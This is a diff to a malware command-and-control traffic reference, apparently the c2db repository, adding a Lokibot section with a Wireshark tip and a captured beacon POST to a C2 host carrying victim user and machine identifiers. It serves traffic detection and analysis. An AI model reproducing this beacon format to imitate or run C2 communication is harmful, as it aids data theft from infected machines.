@@ -36,6 +36,25 @@ el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
 
+#### Lokibot
+
+follw tcp stream, not http stream in wireshark
+~~~
+POST /sky/five/fre.php HTTP/1.0
+User-Agent: Mozilla/4.08 (Charon; Inferno)
+Host: fueda.info
+Accept: */*
+Content-Type: application/octet-stream
+Content-Encoding: binary
+Content-Key: 8DAA705A
+Content-Length: 176
+Connection: close
+
+..'.......ckav.ru..
+...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")
+
 #### Nanocore
 
 flag on "38 00 00 00 17" pattern
